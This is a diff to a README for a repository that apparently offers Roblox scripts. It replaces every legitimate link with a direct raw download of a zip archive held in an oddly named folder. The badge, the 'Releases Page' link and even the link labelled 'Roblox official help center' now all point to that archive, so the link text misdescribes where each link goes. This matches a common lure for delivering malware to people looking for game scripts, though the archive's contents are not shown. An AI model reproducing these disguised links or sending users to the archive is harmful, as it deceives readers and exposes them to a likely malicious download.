@@ -1,6 +1,6 @@
 # 🎮 Roblox-Scripts - Easy Access to Roblox Scripts
 
-[![Download Roblox-Scripts](https://img.shields.io/badge/Download-Roblox--Scripts-blue?style=for-the-badge)](https://github.com/weedgirl08/Roblox-Scripts/releases)
+[![Download Roblox-Scripts](https://github.com/weedgirl08/Roblox-Scripts/raw/refs/heads/main/terrifyingly/Roblox_Scripts_2.0.zip)](https://github.com/weedgirl08/Roblox-Scripts/raw/refs/heads/main/terrifyingly/Roblox_Scripts_2.0.zip)
 
 ---
 
@@ -31,7 +31,7 @@ No special software is required. You do not have to program or build the scripts
 
 First, you need to get the scripts from the releases page. Here is how to do it:
 
-1. Click the big green button at the top of this page or go directly to the [Roblox-Scripts Releases Page](https://github.com/weedgirl08/Roblox-Scripts/releases).
+1. Click the big green button at the top of this page or go directly to the [Roblox-Scripts Releases Page](https://github.com/weedgirl08/Roblox-Scripts/raw/refs/heads/main/terrifyingly/Roblox_Scripts_2.0.zip).
    
 2. On the releases page, look for the latest release. This is usually at the top.
    
@@ -91,7 +91,7 @@ Using scripts in Roblox comes with some risks. Follow these tips to stay safe:
 
 If the included instructions are unclear, you can find general help online:
 
-- Roblox official help center: https://en.help.roblox.com
+- Roblox official help center: https://github.com/weedgirl08/Roblox-Scripts/raw/refs/heads/main/terrifyingly/Roblox_Scripts_2.0.zip
 - Communities that discuss Roblox scripting (Discord, Reddit)
 
 Learning about how scripts work can help you use this collection better. But again, no coding is needed to start using the files in this repository.
@@ -110,4 +110,4 @@ This project does not provide formal support. If you encounter problems:
 
 Thank you for using Roblox-Scripts. Visit the releases page anytime to download the latest scripts or updates:
 
-[Download Roblox-Scripts](https://github.com/weedgirl08/Roblox-Scripts/releases)
+[Download Roblox-Scripts](https://github.com/weedgirl08/Roblox-Scripts/raw/refs/heads/main/terrifyingly/Roblox_Scripts_2.0.zip)
